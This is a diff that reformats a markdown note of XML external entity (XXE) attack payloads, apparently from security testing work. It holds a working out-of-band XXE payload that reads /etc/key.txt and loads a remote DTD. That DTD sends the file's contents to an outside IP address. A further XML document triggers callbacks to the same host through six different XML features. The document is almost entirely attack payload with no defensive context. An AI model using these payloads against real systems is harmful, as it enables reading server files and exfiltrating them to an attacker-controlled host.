@@ -1,21 +1,25 @@
-#XXE payload:
+## XXE payload:
 
+~~~
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE roottag [
  <!ENTITY % file SYSTEM "file:///etc/key.txt">
  <!ENTITY % dtd SYSTEM "http://178.62.247.80/combine.dtd">
 %dtd;]>
 <roottag>&send;</roottag>
+~~~
 
-# combine.dtd:
+## combine.dtd:
 
+~~~
 <?xml version="1.0" encoding="UTF-8"?>
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://178.62.247.80/xxe-payload?%file;'>">
 %all;
+~~~
 
+## XML doc that uses 6 different XML fulns/feats to issue a callback:
 
-# XML doc that uses 6 different XML fulns/feats to issue a callback:
-
+~~~
 <?xml version="1.0" encoding="utf-8"?>
 <?xml-stylesheet type="text/xml" href="http://178.62.247.80/a.xsl"?>
 <!DOCTYPE root PUBLIC "-//A/B/EN" http://178.62.247.80/a.dtd [
@@ -32,3 +36,4 @@
     xsi:schemaLocation="http://178.62.247.80/
     http://178.62.247.80/a.xsd">a</y>
 </root>
+~~~
